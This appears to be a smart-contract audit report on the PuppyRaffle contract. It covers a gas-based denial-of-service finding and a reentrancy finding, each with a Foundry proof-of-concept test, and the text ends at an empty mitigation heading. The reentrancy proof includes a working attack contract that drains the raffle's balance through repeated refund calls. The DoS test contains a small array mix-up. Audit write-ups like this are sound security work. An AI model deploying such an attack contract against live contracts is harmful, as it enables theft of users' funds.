### [Medium-1] An unbounded for loop that results into denial of service

**Description:** 

`PuppyRaffle::enterRaffle` implements a for loop logic that checks for duplicate address by running the check through the array, `PuppyRaffle::players` with a dynamic size. This check can get slowly gas expensive as new address is added to the array and more check is done OR exponentially gas expensive if exploited by attacker.
<details>
<summary>Code</summary>

```javascript
     // @Audit DoS attack
@>      for (uint256 i = 0; i < players.length - 1; i++) {
            for (uint256 j = i + 1; j < players.length; j++) {
                require(players[i] != players[j], "PuppyRaffle: Duplicate player");
            }
        }


```
</details>

**Impact:** 

Due to the unlimited size of the state variable array, `PuppyRaffle::players`, an attacker can exploit `PuppyRaffle::enterRaffle` by exponentially increasing the size of `PuppyRaffle::players`. This makes `PuppyRaffle::enterRaffle`  gas expensive while checking for duplicates address in the for loop. Exponential increase of the size of the array, `PuppyRaffle::players` will render it too expensive. Therefore, economically infeasible for users. Thereby limiting the winner address to attacker's array of addresses.

**Proof of Concept:**

For the first 100 players that entered the raffle, we have the gas to be: `6270396`
While the second 100 players to be: `24361862`

Therefore, this `4x` gas expensive for the second 100 players

<details>

<summary>PoC</summary>

place the following test into the test suite: `PuppyRaffleTest.t.sol`

```Javascript
 function test_DOSAttack() public {
        vm.txGasPrice(1);
        uint initial = gasleft();

        uint playerNumber = 100;

        //initialize an array for first 100 players
        address[] memory DoS_array = new address[](playerNumber);
        for (uint160 i = 0; i < playerNumber; i++) {
            DoS_array[i] = address(i);
        }
        puppyRaffle.enterRaffle{value: entranceFee * playerNumber}(DoS_array);
        //how much gases consumed?
        uint256 gases = initial - gasleft();
        console.log(gases);

        //the gas is astronomically high for second 100 players
        

        address[] memory DoS_arraySecond = new address[](playerNumber);
        for (uint160 i = 0; i < playerNumber; i++) {
            DoS_array[i] = address(i + playerNumber);
        }
        puppyRaffle.enterRaffle{value: entranceFee * playerNumber}(DoS_array);
        //how much gases consumed?
        uint256 gasesSecond = initial - gasleft();
        console.log(gasesSecond);
        assert(gases < gasesSecond);
    }
```
</details>

**Recommended Mitigation:** 
1. The protocol might consider allowing duplicate address. This can be taken into consideration since an attacker can
enter the raffle with multiple addresses to bypass the "duplicate check." So, what use then?

2. Consider using a mapping to check duplicates. Each address that has entered the raffle can be mapped to `bool value:true`. This would allow check for duplicate in constant time.

```diff
-    for (uint256 i = 0; i < players.length - 1; i++) {
-            for (uint256 j = i + 1; j < players.length; j++) {
-               require(players[i] != players[j], "PuppyRaffle: Duplicate player");
-            }
-        }

+    mapping(address => bool) public isAddressEntered;


+  for (uint256 i = 0; i < newPlayers.length; i++) {
+      if (!isAddressEntered[newPlayers[i]]) {
+               players.push(newPlayers[i]);
+               isAddressEntered[newPlayers[i]] = true;
+           } else if (isAddressEntered[newPlayers[i]]) {
+               revert("PuppyRaffle: Duplicate player");
+           }
+ }
```
3. Lastly, you can implement [Openzepplin Enumerable library](https://docs.openzeppelin.com/contracts/4.x/api/utils#EnumerableSet)


### [High-#] RE-ENTRANCY ATTACK: Making external call before state change which would drain the contract balance

**Description:** 
`PuppyRaffle::refund` can be called repeatedly by another contract before its first invocation finishes due to it making 
external call before updating the state variable

```javascript

    @External call>    payable(msg.sender).sendValue(entranceFee);

    @State change>   players[playerIndex] = address(0);
```

**Impact:** 

An attacker can readily enter as a legitimate participant of the raffle and repeatedly exploit the `PuppyRaffle::refund` 
to drain the `PuppyRaffle` contract balance.

**Proof of Concept:**

Paste this test suite in the `PuppyRaffleTest.t.sol` 
<details>
<summary> Proof of Code </summary>

```javascript
   
    function testCanEnterRaffleReentrancy() public {
        //legitimate participants of the PuppyRaffle
        address[] memory players = new address[](4);

        players[0] = playerOne;
        players[1] = playerTwo;
        players[2] = playerThree;
        players[3] = playerFour;
        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);
        uint raffleBalance_beforeAttack = address(puppyRaffle).balance;

        //An attacker enters the raffle with the intention of stealing all funds
        //in the puppyRaffle contract

        REENTRANCY_ATTACK AttackContract = new REENTRANCY_ATTACK(puppyRaffle);
        // address prankin = address(Attack);
        address attacker = makeAddr("Attacker");

        vm.deal(attacker, 2 ether);

        vm.prank(attacker);
        AttackContract.lets_play{value: entranceFee}();

        //Sending payload-
        AttackContract.attack();

        //Raffle balance after successful attack
        uint raffleBalance_afterAttack = address(puppyRaffle).balance;

        //attack contract balance after attack
        uint attackBalance = address(AttackContract).balance;

        //PROOF
        console.log("raffle balance before attack", raffleBalance_beforeAttack);
        console.log("raffle balance after attack", raffleBalance_afterAttack);

        console.log("AttackContract balance after attack", attackBalance);
    }


contract REENTRANCY_ATTACK {
    PuppyRaffle puppyRaffle;
    uint public playerIndex;
    uint public entranceFee;

    constructor(PuppyRaffle raffle) {
        puppyRaffle = raffle;
        entranceFee = puppyRaffle.entranceFee();
    }

    function lets_play() public payable {
        address[] memory players = new address[](1);
        players[0] = address(this);
        puppyRaffle.enterRaffle{value: entranceFee}(players);
        playerIndex = puppyRaffle.getActivePlayerIndex(address(this));
    }

    function attack() public {
        puppyRaffle.refund(playerIndex);
    }

    receive() external payable {
        if (address(puppyRaffle).balance >= 1 ether) {
            puppyRaffle.refund(playerIndex);
        }
    }

    fallback() external payable {}
}

```
</details>

**Recommended Mitigation:** 